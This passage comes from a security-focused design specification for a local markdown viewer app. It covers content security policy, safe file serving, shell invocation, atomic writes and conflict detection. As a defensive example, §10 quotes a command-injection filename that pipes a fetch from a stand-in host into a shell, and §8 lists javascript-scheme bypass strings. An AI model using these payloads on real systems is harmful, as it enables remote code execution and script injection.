- **The `serve` configuration persists in Tailscale's own state, not in this repository.** Nothing here re-establishes it after a reset, and no startup job owns it. That is a hidden single point of failure: record the exact command in the build log when it is first run. **Never `tailscale serve reset`** — it drops every mount, including any other service on the machine.
- **The client builds same-origin relative URLs only** — no absolute URL, port or hostname anywhere in the bundle (F9.3).

**The compensating controls device-trust requires** (F1.3/F1.4):
- **An append-only mutation log**, outside every registered folder: timestamp, method, route, folder id + relative path, source address, `X-Forwarded-For`, `Tailscale-User-Login`, `Origin`, outcome. **A failed log write fails the operation.** Without this, device trust means no incident is *ever* detectable — under a token, a stolen token at least leaves a trail. *Addition, 2026-09-02.* Each log has a **size cap** (`MAX_LOG_BYTES`, 1 GiB); the write that would cross it is refused as `LOG_FULL` and fails the operation like any other log failure. **The app never rotates or deletes a log** — rotation would let a flood push the records from before it off the end, which is the one thing a flood is for — so the operator moves the file aside and restarts. The cap exists because `session.start` carries no token: at the limiter's ceiling the log grows about a gigabyte a day, and a full volume takes down more than this app. The local log has the same cap, and an entry its sink refuses goes to stderr, which the LaunchAgent captures, without the entry's detail. *(This is a log, not a journal — it records what happened, it does not store file bytes. It is not the thing the operator rejected in §13.1.)*
- Settings surfaces **current viewer identity and recent identities**, so a lent phone is at least visible.

---

## 8. Rendered content — CSP and the renderer

**Plain:** The app's own origin is what holds file access, and the markdown it renders was written by agents. So rendered content must never be able to run.

- **The full CSP, as a response header on every response including errors** — not a meta tag. v1's was missing five directives and set one that is unimplementable (F3.2: `default-src 'self'` blocks inline `style=` attributes, and the inherited design language has **316 of them**, so a tired builder would have added `'unsafe-inline'` — possibly to `default-src` — and killed the whole policy):

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self'; manifest-src 'self';
worker-src 'self'; frame-src 'self'; media-src 'self'; object-src 'none';
base-uri 'none'; form-action 'none'; frame-ancestors 'none';
require-trusted-types-for 'script'
```

- **DOM construction only** (F3.3 — v1's "sanitized" constrained input and hrefs but not the renderer's own attribute construction; a zero-dep renderer concatenating HTML leaks on the first unescaped quote). `createElement` / `textContent` / `setAttribute`. **`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` and `srcdoc` appear nowhere in client source** — lint-enforced, CI-enforced.
- **Scheme allowlisting after normalization**: strip control characters, decode entities and exactly one percent layer, lowercase, *then* test against `http`/`https`/`mailto`/internal-file. This is what makes `java\tscript:`, `&#106;avascript:` and protocol-relative `//host` inert. Anything else renders as plain text.
- Code-fence info strings matched to `^[A-Za-z0-9_+-]{1,32}$`; generated element ids prefixed to prevent DOM clobbering.
- **Rendered content is confined** (`contain`, `isolation`) so agent-written content can never draw over app chrome.
- External links open in a new tab with `rel="noopener noreferrer"` and never navigate the app tab. **Remote images and iframes are never loaded** — an image whose src isn't a registered-folder file renders as a placeholder. This is how "zero outbound network" holds for *content*, not just for the app's own calls.
- Internal links are resolved **server-side** through the §4 checker.

---

## 9. The file-serving endpoint — bytes, never documents

**Plain:** Showing you an image from your tree opens a door: a file that claims to be an image but is really a web page could take over the app. v1's rule had a hole big enough for exactly that.

v1 said "never served as `text/html` or `application/javascript`." **`image/svg+xml` is neither** — and an SVG loaded *as a document* executes `<script>` in the serving origin (F3.1, found independently by two reviewers). Three ordinary paths made it a document under v1, including the PDF preview: with zero third-party deps there is no PDF.js, so the natural implementation is an iframe, and v1's CSP had **no `frame-src`**, falling back to `default-src 'self'` — same-origin iframes allowed.

**Rules:**
- Every response carries: `Content-Security-Policy: sandbox; default-src 'none'; style-src 'unsafe-inline'` (opaque origin) · `X-Content-Type-Options: nosniff` · `Cross-Origin-Resource-Policy: same-origin` · `Referrer-Policy: no-referrer` · `Cache-Control: no-store` · RFC 6266 `filename*` (a raw filename in a header is header injection).
- **Content-Type is a closed positive allowlist keyed on extension**, never sniffed, never client-supplied: `png jpg jpeg gif webp heic pdf`. Everything else → `application/octet-stream` + `Content-Disposition: attachment`.
- **`.svg` MUST NEVER be served as `image/svg+xml`.** Same exclusion for `.svgz .html .htm .xhtml .xht .xml .xsl .xslt .mhtml .webmanifest .js .mjs`.
- PDFs render only in `<iframe sandbox>` **without** `allow-scripts` and **without** `allow-same-origin`. Images only via `<img>`. **No preview ever navigates the top frame to a file URL.**
- Refuse over **25 MiB**. Range requests: single range, clamped, 416 on invalid, `Accept-Ranges` advertised.
- *Field note, worth knowing:* **zero PDFs exist anywhere in the real tree.** The PDF requirement is what creates this endpoint and its whole attack surface, for a file type the operator does not have. Kept because it is cheap once the rules above are followed — but it should be the first thing cut if v1 needs to shrink.
- **Read-only plain-text view** (FT-10, the one place round 2 recommended *adding* scope): `.txt`, `LICENSE`, `.json`, `.yml`, `.csv` under 256 KiB that decode as UTF-8 get a monospace read-only pane, served `text/plain` + nosniff, **no edit affordance and no write path.** Without it these are simply unreadable on the phone. This does not weaken §6 — the *editor* still opens for `.md` only.

---

## 10. Shell actions (desktop only)

**AMENDED 2026-08-09 on the ruling: "we can drop open default app entirely then and just focus on reveal in finder we can still defer that to later."**

**Open in Default App is CUT from v1.** Not deferred — removed. Reveal in Finder remains, and remains scheduled for P12.

**Why this is a security reduction and not a scope cut with a cost.** Almost everything below existed for Open in Default App specifically: it is the verb that hands a file to *another application* to act on, so it needed a positive extension allowlist, an explicit refusal list, an execute-bit and hard-link check, a Settings opt-in and a one-use gesture nonce. **Reveal in Finder does none of that** — it asks Finder to show a location. The attack surface that made §10 the most intricate section in this document leaves with the verb it was written for.

**What prompted it.** The operator ruled that the non-editing pane offers no download and simply says it cannot display the file, with the row menu as the way out (§12, P7's brief). That made Reveal in Finder the escape hatch, and raised the question of pulling it forward. Their answer went the other way and further: Reveal stays in P12, and Open in Default App goes entirely — *"for non compliant file types, wherever the reveal and finder option lives is the users path."*

**Plain:** "Reveal in Finder" asks macOS to show you where a file lives. It is the one place this app talks to the operating system about a path, so it still gets checked.

**Rules for Reveal in Finder, which is all that remains:**

- **No shell, ever** (F5.1 — v1 validated the path and said nothing about invocation, and the zero-dep translation of Electron's `shell.openPath` is `exec("open \"${path}\"")`; a filename like `note"; curl evil.sh | sh; #.md`, writable by any agent, is command injection). **`execFile('/usr/bin/open', ['-R', '--', absPath])` with `shell: false`**, absolute binary path, minimal environment. Lint rule forbids string interpolation into a command line.
- **`-R`, and it is load-bearing.** Reveal, never open. Without it the same binary opens the file in whatever application claims it, which is the verb that was just cut — reinstated by a missing flag.
- The path goes through §4's checker and is refused if it is reached through a symlinked segment, or resolves outside every registered root. **Check the realpath, never the client string.**
- **No extension allowlist, and its absence is deliberate.** Revealing a `.app` shows you a bundle in Finder; it does not run it. A closed type list here would be a control with nothing behind it, and this build deletes those.
- ~~**Refused entirely on `PORT_TAILNET`** — it acts on the Mac's screen and is meaningless from the phone.~~ **VOID (ruled 2026-08-14).** The route ships as `carriedBy: 'both'` — see §21 and `contract/routes.ts`. **Desktop-only is now a UI decision (§18.8), not a router one.**

**Voided by this amendment**, listed so nothing implements them from an older reading:

- the positive type allowlist `.md .txt .pdf …` and the refusal set `.webloc .inetloc .fileloc .url .workflow .scpt .terminal .jar .pkg .dmg .iso .prefPane .saver .qlgenerator` (F5.2)
- the execute-bit, `st_nlink > 1` and directory refusals, which existed to stop macOS *executing* something
- the Settings opt-in and the one-use 30-second user-gesture nonce
- **annex A7's second half** — *"bind desktop double-click to Open-in-Default-App so the shortcut survives"*. There is no such shortcut to survive. A double-click on a non-editable row does nothing.
- **PRD `Files`**, two clauses: *"Desktop-only actions: Reveal in Finder, Open in Default App"* keeps only the first, and *"on desktop, double-clicking a non-editable row opens it in the default app"* is void.

**F5.3 survives and is now trivially satisfied.** The write→open chain — the write API accepts `.md` and text content only, so nothing can write arbitrary bytes to an arbitrary extension and then ask macOS to open it — held because of the allowlist. It now holds because **there is no open verb at all.**

**Where Reveal in Finder appears** (the operator, same ruling): the row "⋯" menu in the Files tree, and the equivalent menu on Tasks and Inbox items. Not a dedicated button — *"maybe we make a button later"*.

---

## 11. Folder registration

**Plain:** Registering a folder is the most powerful thing the app does — it's what decides how much of your disk is in play.

- **Privileged verb, `PORT_LOCAL` only** (§7). **The folder-browser enumeration API is equally privileged** (F6.3 — v1 gated *registration* and left *browsing* arguably open, which is a whole-disk read oracle). Directory names only; refuses dot-segments and other users' home directories.
- **Positive structural rules, not a deny-list** (F4.5 — a deny-list loses, because `/Users`, `~/Library` and `~/Documents` are not "system directories"): the candidate must realpath to a directory, contain no symlinked segment, and be **neither equal to, nor an ancestor of, nor a descendant of** an existing root. v1 rejected ancestors only — **descendants and case/normalization duplicates were not rejected**, which gives one file two folder ids, two index entries, and breaks both the append lock and the conflict guard. Plus an explicit deny set (filesystem root, bare `~`, the app's own config directory), no dot-segments, and a **cap of 16 roots**.
- A **typed second confirmation** for shallow candidates or any candidate over 50,000 files.
- **Roots loaded from config at startup are re-validated identically** — otherwise the config file is a registration bypass.
- ~~**Backup check at registration** (F7.6): refuse to register a folder that is neither inside a git repository nor covered by Time Machine, without a typed override.~~ **CUT 2026-08-09 by the operator — "cut it".** It measured the wrong thing: it asked whether a `.git` existed above the folder and **never whether anything had been committed**, so a repository holding days of uncommitted work passed silently, while every folder outside a repository charged a typed override. The operator: *"I don't always back it up and I also run non-soil things in the viewer sometimes."* False comfort where the risk was real; friction where it was not. The moment was also wrong — "is this folder in a repo" is a fact about the folder, true forever once true, while "is my work recoverable" changes on every keystroke, and a check that runs once at registration cannot answer the second. §13.1's no-journal decision stands and is unaffected: git remains the recovery layer, the app simply stops pretending it can verify one exists. What protects the files is unchanged — never deletes, atomic writes, content-hash conflict detection, and rescue-before-refuse. §21.

---

## 12. The editor — CodeMirror 6

**Plain:** This is the section that changed the build. The old editor parsed your file into a structure and then re-printed it, which is why it silently rewrote things. The new one holds your actual text and paints formatting on top of it. Headings look big, bold looks bold, and the raw syntax shows only on the line your cursor is on. Nothing regenerates, so nothing can be lost.

**Why, in one line, measured:** every markdown file in a real tree — a little over sixteen hundred — was run through the old code path in a real Chromium runtime. **One non-empty file survived byte-identical.** Installing every missing extension left that count unchanged — the cause is structural, not a missing feature.

**Rules:**
- **CodeMirror 6 with live-preview decorations** — the Obsidian / Zettlr architecture. The complete pinned set is `app/package.json`, which is the authority; the load-bearing ones are `codemirror` 6.0.2, `@codemirror/lang-markdown` **6.5.2**, `@codemirror/view` **6.43.8**, `@codemirror/state` 6.7.1, `@lezer/markdown` 1.7.2. *(`lang-markdown` and `view` were re-pinned 2026-08-05 on the security review's re-screen — 6.5.2 fixes silent content deletion in `insertNewlineContinueMarkup`, which is the Enter key inside a list or blockquote. Amended before any install; see the build log.)*
- **One surface, always editable — there is no reading view and no edit toggle** (ruled 2026-07-29). Formatting is rendered continuously; raw markdown is revealed **only on the line the cursor occupies**. This voids the PRD's "rendered reading view; explicit edit toggle (plus click-to-edit)" and annex A11's two-way-toggle work item. **The reason it matters beyond simplicity:** two rendering paths that must stay pixel-identical is exactly how the old app's preview came to disagree with its editor — and that disagreement is why 62% of damaged files still *looked* correct. One surface cannot disagree with itself.
- **The buffer is the file's text.** There is **no serialization step anywhere in the app.** A save writes the buffer's bytes. This is a structural property, not a feature to be implemented — and it is what makes §20's byte-identical acceptance test passable at all. *(v1's test was, correctly, called unpassable for a WYSIWYG editor — M14. The editor decision resolves it rather than softening the test.)*
- **Frontmatter needs no special handling in the editor** — it is text like everything else, so byte preservation is automatic. v1's "detach, hold byte-for-byte, reattach" machinery is **deleted as unnecessary.** In the *render*, a leading `---` block renders as a collapsed properties block — **never as a thematic break plus a setext heading**, which is the old app's bug and the reason 944 files were being silently flattened.
- **v1's "lossy-edit fallback" is deleted** (C1a). It existed because the rich editor could not round-trip; there is nothing it cannot round-trip now.
- **Tables: styled monospace** (the call). Aligned, monospaced, edited as pipes. **No editable grid in v1** — a grid is the one feature that would reintroduce markdown regeneration, which is the thing this whole section exists to eliminate.
- **The editability gate** (FT-2): a `.md` file is editable only if its bytes decode as valid UTF-8 with no NUL. Failing either opens the **non-editing pane with a reason**, never plain-text mode, never an editor. *(Two live files in the real tree are not valid UTF-8 and would have opened the rich editor under v1.)* BOM detached and reattached byte-for-byte; **line endings preserved exactly** (a CRLF file saves back CRLF); trailing-newline state preserved.
- The non-editing pane is reachable for `.md` too — files rejected by the UTF-8 gate or the 2 MiB cap — always with a reason string (FT-11).
- **Renames across the editability boundary are refused** (FT-5): `photo.png` → `photo.md` would make a PNG editable, and one keystroke would rewrite it.
- **Editor keyed on file identity, not path.** Switching files remounts; a pending save always resolves against the file it was typed into.
- **Flush on every exit path. The primary trigger is `visibilitychange` when `document.visibilityState` becomes `hidden`** — that is the last moment mobile WebKit reliably gives you. `pagehide` fires as a second, duplicate flush, and `beforeunload` as a third on desktop. **Flushes MUST be idempotent and incremental**, so that no single event is load-bearing and firing three times costs nothing.

  **The flush request MUST carry `keepalive: true`** (`fetch(url, { keepalive: true })`). Without
  it the browser is permitted to cancel an in-flight request as the page freezes or unloads, so
  the correct trigger fires and the save still does not land. *(Added 2026-08-06 from the earlier application, which
  ships this in production; the spec had the right triggers and no keepalive.)*

  **The save decision MUST be gated on a dirty flag, and that decision MUST be pure and
  separately testable.** These triggers fire constantly — every app switch, every backgrounding.
  The earlier application learned this the expensive way: an unguarded save-on-every-trigger turned one test note
  into roughly nine archive copies in seconds. A save that writes nothing must cost nothing.

  **A failed exit-save keeps the editor open in a visible unsaved state.** It is never dropped
  silently, and it never resolves by discarding the buffer (§13.5).

  *Corrected 2026-08-05.* The previous rule required flushing on `pagehide`, "not only `beforeunload`, which does not fire on iOS Safari backgrounding." The premise about `beforeunload` is right and the conclusion was wrong: **`pagehide` does not fire in that case either.** The documented failure is identical for both — open the page, switch apps, close the browser from the app switcher, and neither event is dispatched. `pagehide`'s real advantage is bfcache compatibility, not delivery. Desktop Safari is worse still: closing a tab with the (X) dispatches neither `visibilitychange` nor `pagehide`. **No end-of-session event is guaranteed on mobile WebKit**, which is why the rule is now three overlapping triggers plus idempotency rather than one event treated as reliable.
- **Design language is inherited verbatim** from the preceding application's measured values — warm dark, base font weight 300, editor body 0.9rem at 1.78 line-height, 720px measure, zero emoji in UI.

---

## 13. Data safety

**Plain:** Never lose or corrupt a file — including when you and the phone touch the same one, when an agent edits underneath you, or when the app crashes mid-save. Round 2 found eight independent paths to permanent loss. **Three needed no concurrency at all.**

### 13.1 The journal — declined, on the operator's reasoning

The data reviewer's single highest-value recommendation was a pre-write journal: copy a file's current bytes aside before every write. **the operator declined it, and their reasoning is better than the recommendation:** *a backup written by the app cannot protect against the app* — if the app reads a file wrong, the journal faithfully stores the wrong bytes. Git is a separate program that does not share the app's bugs, so git is the recovery layer. They also ruled out `git diff` as a *workflow* ("I'm not doing git checks"), so the app must never require it.

**What carries the weight instead:** the prevention rules in 13.2 and the copy-first gate. Worth noting honestly: the editor decision removes the largest corruption vector entirely, which lowers the journal's marginal value a great deal — declining it is more defensible now than it was when it was recommended.

**The backup check at registration was on that list and was cut on 2026-08-09** (§11, §21). It was never carrying weight: it verified that a `.git` existed above the folder, not that anything had been committed. And the ruling directly above — *"I'm not doing git checks"* — was already the answer. A prompt that requires them to have used git, at the one moment they are least likely to be thinking about it, is the workflow they ruled out, arriving as a dialog.

### 13.2 The three loss paths that need no concurrency — closed

- **A failed read must never become an empty file** (C2 — the cheapest total-loss path, and the old code shipped a cousin of it). A read fails (an agent moved it 200 ms ago, iCloud hasn't materialized it, TCC denied, a volume hiccup) → the editor mounts on an empty document → one keystroke → autosave → **on-disk mtime is unchanged so the conflict check passes** → a 400-line file is permanently empty. **Rule: no save without a load.** The editor MUST NOT become editable until a read has completed and its bytes are held. A failed or partial read renders a named error with editing disabled. No save is ever issued for a file whose load did not complete.
- **Truncation guard.** A save whose byte count is zero, or less than half the loaded count, is **blocked** and surfaced as an explicit confirmation naming the loss ("this will remove 380 lines").
- **A full disk must never rename a truncated temp over good content** (C3). Open the temp `O_CREAT|O_EXCL|O_NOFOLLOW`, mode 0600, **on the destination's own volume**; write checking the returned count; `fsync`; **`fstat` and assert the size equals the intended size**; close; rename; `fsync` the directory. **Any failure aborts before the rename.** ENOSPC/EDQUOT → sticky named error, buffer retained, temp left for the sweep, never renamed. Also: `rename(2)` succeeds over a *non-writable* file when the parent is writable — so check mode and the `uchg`/`schg` flags explicitly and open read-only with a visible reason.

### 13.3 Atomic writes

- Temp file **in the destination directory**, named `.<basename>.tmp-<16 hex>` (F7.3 — v1's "same filesystem but not inside a watched folder" is unsatisfiable on an external drive: it produces `EXDEV`, and the builder then falls back to a non-atomic write, the exact thing the rule forbids). The `.*.tmp-*` pattern is on §3's ignore list. A predictable temp path pre-created as a symlink by an agent would redirect the user's document — hence `O_EXCL|O_NOFOLLOW`.
- **Read and reapply the destination's mode, xattrs and Finder tags** before the rename (M3) — otherwise every save destroys them, and "nothing is ever destroyed" should extend to metadata.
- Startup sweep of orphaned temps older than 24 h. **This is app scratch, not a registered folder** — stated explicitly so it doesn't read as violating no-delete.
- **Writes never create directories.** A write whose parent doesn't exist **fails loudly**. Only explicit create-folder and move create directories — and **move creates at most one level, non-recursively, inside an already-contained parent, re-verified after creation** (v1's "writes never create directories" was satisfiable while `mkdir -p` lived in move).

### 13.4 Conflict detection — content hash, not mtime

**mtime is the wrong token and is ambiguous in the direction that loses data** (C4). Six ways it fails, one of which is decisive: **`mv` preserves mtime**, so an agent's `mv draft.md notes.md` gives the path an *older* timestamp — under a `>` comparison no conflict fires and the app writes over a completely different file. Also: `mtimeMs` is a float double and cannot represent APFS nanoseconds; NTP and wake move the clock backwards; inode identity was never checked; and **false positives are equally harmful** — an agent rewriting identical bytes would spawn a permanent conflict artifact, which on this tree is the *common* case.

- **Capture `(dev, ino, size, nanosecond mtime, SHA-256 of bytes)`. A conflict exists if and only if the content hash differs.** Timestamps are advisory, compared with `!=`, never ordered.
- **The conflict hash is read fresh from disk via `fstat`/read on the descriptor being written — never from the index** (F4.6).
- The new baseline is taken by `fstat` on the temp descriptor **after `fsync` and before rename** — re-`stat`ing the destination afterwards would adopt an agent's interleaved write as the app's own baseline.
- Hashing one markdown file per save is negligible (largest real file: 63 KB).

### 13.5 The conflict artifact — redesigned

v1's sibling was broken six ways, one of which **loses the edit it exists to save** (C5). It was indexed (a conflict on a task in `02-next/` becomes a second card on the board that can never be removed, because there is no delete); `HHMM` granularity plus two 1-second autosaves means the second conflict clobbers the first; names grew unbounded toward `NAME_MAX`, and on overflow the conflict write fails `ENAMETOOLONG` **and the edit is gone**; which file was canonical was never stated; there was no resolution path; and it was announced by a 2.5-second auto-dismissing toast, which on a phone in a pocket is invisible.

- Name: **`<base>.conflict-YYYYMMDD-HHMMSS-<4 random base32><ext>`**, exclusive create, retry with a fresh suffix, cap 50.
- **If the conflict file cannot be written for any reason, the buffer is retained client-side and the editor enters a blocking unsaved state. An edit is never discarded because its rescue file failed.**
- Every generated path is pre-validated against `PATH_MAX` / `NAME_MAX` **in bytes** (the deepest real path is 230 chars; `NAME_MAX` is 255 bytes).
- **Conflict artifacts are grammar-excluded** — never a card, inbox item, project or chatroom. They appear in Files only, marked, plus a persistent **"Needs attention"** list. A conflict file never spawns a conflict child.
- **Resolution is a v1 requirement, not a later nicety:** two-pane mine/theirs with Keep Mine / Keep Theirs / Keep Both, ending with one file at the canonical path and the loser moved to app-private archive. **The editor always retargets to canonical.**
- **Data-safety events never use the auto-dismissing toast.** Persistent, dismiss-required banners.

### 13.6 Rename and move — two named modes

v1 mandated both "rename into place" and "exclusive rename" without distinguishing them (C6). Resolve it one way and every save after the first fails `EEXIST`; resolve it the other and user-facing Rename/Move gets a plain `rename()` that **silently destroys whatever is at the destination** — one tap, no confirmation, no trace, in an app whose headline promise is that nothing is ever destroyed. The old code did exactly this.

- **Replace-rename** — *only* the atomic-write temp→destination, where the destination's identity token was just verified. Plain `rename(2)`. Clobbers by design.
- **Exclusive rename** — every user-visible Rename, Move, Duplicate, archive-move and template placement. **No path outside the atomic-write sequence may call `rename(2)` without exclusive semantics.**
- **How exclusivity is achieved with zero dependencies** (resolving contradiction #3 — `RENAME_EXCL` is a macOS syscall flag Node's `fs` does not expose, so v1 contained two mutually exclusive MUSTs): for **files**, `link(src, dest)` then `unlink(src)` — `link` fails `EEXIST` from the kernel, which is exactly the atomic exclusive create needed. For **directories**, `lstat(dest)` must throw `ENOENT`, then `rename`, executed under the per-parent mutation lock. *The directory case has a residual TOCTOU window; it is bounded by the lock and accepted on a single-user machine. Stated rather than hidden — if it ever matters it is an escalation under §2.*
- **Case-only rename:** when source and destination resolve to the same `(dev, ino)` — detected by `stat`, never by string comparison — drop exclusivity and rename directly. (v1 permitted case-only rename while also mandating exclusive rename, which would have failed on APFS because the destination *is* the source.)
- Collisions are refused with a named error offering an auto-suffixed alternative.
- **Collision checks discriminate `ENOENT`** from "couldn't determine": any non-`ENOENT` error (e.g. `EACCES`) aborts. It is never treated as a free destination.
- **Writing through a symlink** (M4): resolve to the target, containment-check the **target**, atomic-replace at the resolved path so the link survives; refuse if the target is outside every root; refuse writes to `st_nlink > 1`.
- **Slugification cannot produce an invisible file** (M16 — the old implementation maps `日本語` to the empty string, producing a file literally named `.md`, hidden by the dot rule and lost on creation). Preserve Unicode letters and digits under NFC, lowercase, collapse other runs to `-`, trim, **reject empty / dot-only / leading-dot with a named error**, validate `NAME_MAX` in bytes, and preview the final name before confirm.

### 13.7 Moves, recursive copies, and the lane-ghost bug

- **The move-mkdir exception resurrects folders an agent deliberately removed** (M2). A lane drag *is* a move, and the destination lane was a client-supplied string — so a stale board plus a renamed lane materializes a ghost lane. Since folders **are** the database, that is structural corruption. **Fix: the destination must already exist and is resolved server-side from the current index. The client names a lane id from the server's last payload, never a path.** A move to a lane absent from the current index is refused and the board reloads.
- **Recursive-copy safety covers all recursive copies** — Templates, Duplicate-folder and New Project alike (M1; the old `copyDir` dereferences every symlink and throws `EISDIR` mid-copy, leaving a partial tree with no rollback). **Pre-flight walk** computing count, bytes, max path length and symlink presence **before any byte is written**; refuse on cap or `PATH_MAX`/`NAME_MAX`; never follow symlinks (skip and report); skip non-regular files; copy `st_nlink > 1` by content, never by `fs.link`; §3's ignore list applies; exclusive inner copies; refuse when source and destination contain each other; re-validate the source per file during the walk.
- **"Fails and leaves nothing behind" without a recursive delete** (F7.1 — v1's wording required exactly the recursive-remove function the no-delete law forbids). **Stage into a temp directory outside every registered folder on the same filesystem, then a single exclusive rename into place on success.** The staging area is app scratch and is **the only place in the codebase where recursive removal exists** — and it MUST refuse to operate inside a registered folder.
- **Guards are measured in indexed files affected, not bytes** (M6 — a directory rename moves zero bytes, so v1's byte threshold would let a project move silently remove 200 files from every view). Confirmation names the count. Move-into-own-descendant is refused.

### 13.8 Mutations, identity, and retained buffers

- **Every mutation carries the identity token the client was last shown** (M10 — v1's sequencing covered reads only). The server re-verifies and refuses with `stale-target`. Mutations are serialized per target path server-side. The client disables the row or card while one is in flight. Without this: double-tap Duplicate creates two files that each found the name free; a row action against a path an agent just replaced renames the **wrong file**, while obeying every other rule.
- **Retained buffers live in IndexedDB, never `localStorage`** (M15) — **on quota grounds only.** `localStorage` shares a ~5 MB quota, so a large buffer throws and is dropped silently; IndexedDB does not. **A retained buffer is never auto-replayed.** Compare the retained identity token and present explicit resolution: view diff / save as conflict sibling / discard. A quota failure is a blocking error, never a dropped edit.
- **Retained buffers are NOT durable on the phone in a plain browser tab, and the app must say so.** WebKit's tracking prevention deletes **all** script-writable storage after 7 days without user interaction, and Apple's list of what it deletes names **IndexedDB explicitly**, alongside localStorage, sessionStorage and service-worker registrations. The **only** documented exemption is a Home Screen web app: the first-party domain of an installed web app is exempt from the 7-day cap. `navigator.storage.persist()` is not a reliable escape on WebKit.
  - **Therefore:** installing to the Home Screen (§15, already required for secure-context reasons) is what makes phone-side retained buffers durable. The app states this at first run on a phone and in Settings, in plain language — *"unsaved work is kept on this phone only if Soil Viewer is added to your Home Screen."*
  - **Accepted and recorded, not a bug:** a phone used as a plain browser tab loses a retained buffer after 7 idle days.

  *Corrected 2026-08-05.* The previous rule gave two reasons for choosing IndexedDB, and **the second was false**: it stated `localStorage` "is evicted after 7 days on iOS Safari," implying IndexedDB is not. IndexedDB is evicted on the same schedule by the same mechanism. **Moving to IndexedDB buys zero eviction immunity.** The quota reason is sound and is sufficient on its own, so the decision stands — but the durability belief underneath it did not, and a retained buffer is the rescue path for an unsaved edit under §13.5.
- **Restored view state is untrusted input** (F9.2): re-validate every path through §4, discard unknown folder ids, discard corrupt or >256 KB blobs.
- **The folder registry and UI state are separate files** (M7 — sharing one file means a UI-state write from a stale copy deregisters folders). The registry is written only by explicit Settings flows; removal **appends to a `deregistered` list** rather than dropping the entry. Config writes are as safe as user writes: atomic temp+rename, and a config that fails to parse is **preserved and surfaced, never silently replaced with defaults** — which would deregister everything.
- **Config keys retarget when the app moves or renames the thing they describe** (round-1 M5, flagged in round 2 as never having landed — it hadn't; added here). The Projects board's column arrangement lives in app config keyed by project path (PRD), so renaming or moving a project would silently revert its placement to the default column — the app quietly undoing the user's own arrangement. **Rule: any operation that renames or moves a path updates every config key referencing it, in the same transaction.** A config key whose path no longer resolves is **retained, not dropped** — a temporarily unavailable volume must not erase arrangement — and is surfaced in Settings as unresolved.

---

## 14. The chatroom render

**Plain:** Files named `chatroom.md` render as a conversation rather than as a document — the user's daily reading surface, and the one they asked to be certain survived.

**Rules:**
- **Match: the final path segment equals `chatroom.md` exactly** (NFC, case-folded). **Not a glob** — `chatroom-protocol.md` and `chatroom-template.md` are ordinary documents and MUST render as such (resolves §11-of-v1's open item m8).
- **Message header: `## M<n> -- <Author>`** at line start — two hyphens, spaces either side. Verified against the real tree; the format is already documented in the soil's own chatroom protocol. `###` and deeper headings inside a message body are content, never message boundaries. A `##` line that does not match the pattern is content.
- **Composer appends.** The next message number is recomputed **from the file's current bytes at append time**, under the per-inode lock — never from the client's view.
- **Appends are exempt from conflict detection** (M9 — this matters and is counterintuitive). An append does not depend on prior bytes; that is what makes it an append. Under v1's rule, an agent posting while the phone appends would send the phone's message to a conflict sibling, and the conversation becomes two files with two composers and broken numbering. Instead: under the per-inode lock, re-read the tail, recompute the number, and **append with `O_APPEND` directly** — no temp+rename, which is also what preserves the kernel's append atomicity. **A conflict artifact of a chatroom is never itself a chatroom.**
- **The append lock is keyed on `(st_dev, st_ino)` from the descriptor** (F7.4), not on a path string. For a not-yet-existing file: normalized realpath of the parent plus normalized basename. The same key governs full-file saves, so an append can never race a save of the same file.
- Author colors come from config. Message bodies render through §8's renderer — **agent-written content, same rules as anywhere else.**
- **Two inherited requirements from the binding annex, both easy to miss:** a **jump-to-bottom** control, and **auto-scroll only when already near the bottom** (never yank the view while reading history).
- The **copy-path-into-file bar** is part of this surface — it is the affordance the operator remembered and asked to keep.

---

## 15. Live updates, multi-client, offline

**Plain:** Mac and phone are both live windows on the same files. A change in one shows in the other — but your own view shouldn't yank the other screen around, and the phone needs to behave when the Mac is asleep.

- **Transport: Server-Sent Events**, one stream server→client, reconnect with exponential backoff 1s→60s. Named explicitly so nobody reaches for `setInterval`. `Origin`-validated on every connection — SSE and WebSocket handshakes are **not** covered by CORS and are the classic hole (and one of the security review's four conditions in §7).
- **On regaining visibility, the client MUST tear down and reopen the stream unconditionally, and refetch the state it displays. It MUST NOT wait for an error.** *(Added 2026-08-06 from an earlier app, and this closes a real hole rather than adding polish.)* **iOS suspends a backgrounded web app, and a suspended `EventSource` can come back dead without ever firing `error`.** Backoff-on-error therefore never triggers: the stream is silently finished, the app looks connected, and no update ever arrives again. Reopening unconditionally on `visibilitychange`→`visible` and on `window.focus` is the only reliable recovery — do not probe first, just reopen. The refetch is required alongside it because anything that changed during suspension was never delivered.
- **One-shot signals delivered over the stream can vanish and must report their own delivery.** A message emitted while the phone is suspended is simply lost — there is no replay. Data-change events survive because the focus-regain refetch covers them; an imperative one-shot has no such recovery. If any such signal is ever added, it reports *delivered* versus *no client connected* rather than assuming it landed.
- **Limits** (F8.4): 4 streams **per client**, 32 total, 15s heartbeat, ≤250 ms event batching, bounded queue — on overflow emit a `resync` event rather than buffering without limit.

  *Corrected 2026-08-07 (the security review's C9 and K7).* This said *"4 streams per address"*, and implemented
  on the address it was a **global cap of four** — every device shares `127.0.0.1` behind
  `tailscale serve` — which made the 32 total unreachable and presented as *"the app randomly stops
  updating on one device."* A client here is **the stream ticket**, which is the only per-client
  identity that has been *verified* at the point this cap is applied.
- **File truth is server-side; view state is per-client.** Which file is open, active tab, sidebar state live in each client's own storage. "Live everywhere" means the *files* are live, not the cursor. *(This resolves contradiction #16 — v1 said `localStorage` in one section and config in another.)*
- ~~**Server-down is the phone's normal case** (Mac asleep, lid closed, tailnet drop). A minimal service worker shows an offline state naming the actual problem — *"Your Mac isn't reachable"* — rather than the browser's error page.~~
- ~~**Service worker rules** (F9.1 — a vault file registered as a service worker is a permanent origin takeover): narrow scope; **versioned shell assets only, never an API or file response**; build-hash cache keys; a kill-switch route; `worker-src 'self'`; and the SW script itself comes from the build-time asset map only. It caches **no content** — which also matters for revocation (§1).~~
- ~~**An installed web app on iOS is resumed, never relaunched — so it never checks for a new service worker on its own.** The client MUST call `registration.update()` on `visibilitychange`→`visible`, and reload **once**, guarded, on `controllerchange`.~~

  > **THE THREE BULLETS ABOVE ARE VOID — CUT 2026-08-15: _"Let's abort offline support,
  > not worth it with any risk."_** They were given the mechanism in full: a service worker is a resident
  > program inside the browser that survives reloads and restarts, so a bad cache or a wrong update
  > path can strand the phone on a broken build with no remote fix, and the recovery — clearing site
  > data — is buried in iOS Settings. They took the trade against the benefit, which was only that the
  > app would *open* while the Mac is unreachable. **Nothing is built; there is no worker to remove.**
